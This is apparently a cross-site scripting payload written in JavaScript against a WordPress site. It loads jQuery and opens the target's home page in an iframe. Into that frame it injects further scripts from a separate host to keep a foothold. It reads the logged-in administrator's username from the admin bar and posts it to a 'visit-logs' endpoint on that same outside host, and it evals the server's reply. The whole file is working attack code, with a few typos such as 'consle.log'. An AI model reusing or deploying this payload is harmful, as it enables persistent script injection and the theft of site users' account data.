var strMyPosition="XSS";
var frameWindow=null;
var frameDocument=null;

//--------------------------------------------index page-----------------------------------------------------------------------
function inPageIndex()
{   //test is login
    var strUsername="";
    if($("#wpadminbar").length>0)
    {   //login already
        strUsername=$("#wpadminbar").find("a.ab-item[href='http://localhost/wp-admin/profile.php'][aria-haspopup='true']").text();
    }
    else
    {   //not login
    }
    $.ajax
    (
        {
            type:"post",
            url:Common.getJSHost()+"visit-logs/add2",
            data:
            {
                username:strUsername
            },
            success:function(data,textStatus)
            {
                try
                {
                    var json=eval("("+data+")");
                    if(json.success)
                    {
                        consle.log("visit log success");
                    }
                    else
                    {
                        consle.log("visit log fail");
                    }
                    console.log("parent position value:"+window.parent.strMyPosition);
                }
                catch(e)
                {
                    console.log("in exception parent position value:"+window.parent.strMyPosition);
                }
            }
        }
    );
}
//set position for iframe
function setPositionIndex()
{
    setPosition("index");
    Common.callBackAfterJSLoad(Common.getJSHost()+"zfirst/js/common.js","idScriptCommon",null,null,false,frameDocument);
}
//-------------------------------------------------------------------------------------------------------------------

//add changable iframe
function addIFrameChangable()
{
    var $body=$("body");
    if($body.length===0)
    {
        throw "can not get body element";
    }
    //load home page and inject xss
    $body.append("<iframe id=\"idIFrameChangable\" src=\""+Common.getTargetHost()+"\" width=\"100%\" height=\"50%\"></iframe>");
    $("#idIFrameChangable").load
    (
        function()
        {
            console.log("load index frame success");
            //$(window.frames[0].document).find("head").append("<script src=\""+Common.getJSHost()+"zfirst/js/xss_index.js\"></script>");
            frameWindow=window.frames[0].window;
            frameDocument=window.frames[0].document;
            Common.callBackAfterJSLoad(Common.getJSHost()+"zfirst/js/xss.js","idScriptXSS",testIFrameXSS,setPositionIndex,false,frameDocument);
        }
    );
}

//test for xss for iframe
function testIFrameXSS()
{
    var bReturn=false;
    //if(typeof(window.frames[0].window.mainJSFunctionEntry)!=="undefined")
    if(typeof(frameWindow.mainJSFunctionEntry)!=="undefined")
    {
        bReturn=true;
    }
    return bReturn;
}
//set position
function setPosition(strPosition)
{
    //window.frames[0].window.strMyPosition=strPosition;
    frameWindow.strPositoion=strPosition;
}


//judge change frame or post
function addIFrameOrPost()
{
    console.log("current position:"+strMyPosition);
    if(strMyPosition==="XSS")
    {   //XSS
        addIFrameChangable();
    }
    else if(strMyPosition==="index")
    {   //index
        inPageIndex();
    }
    else
    {
        throw "unrecongnized position:"+position;
    }
}

//test for jquery
function testJQuery()
{
    var bReturn=false;
    if(typeof($)!=="undefined")
    {
        bReturn=true;
    }
    return bReturn;
}

//main js function entry
function mainJSFunctionEntry()
{
    try
    {
        //check if jquery is useable
        if (!testJQuery())
        {
            Common.callBackAfterJSLoad("https://ajax.microsoft.com/ajax/jquery/jquery-2.1.4.min.js","idScriptJQuery", testJQuery, addIFrameOrPost,true,document);
        }
        else
        {
            addIFrameOrPost();
        }
    }
    catch(e)
    {
        console.log("error in mainJSFunctionEntry:"+e);
    }
}
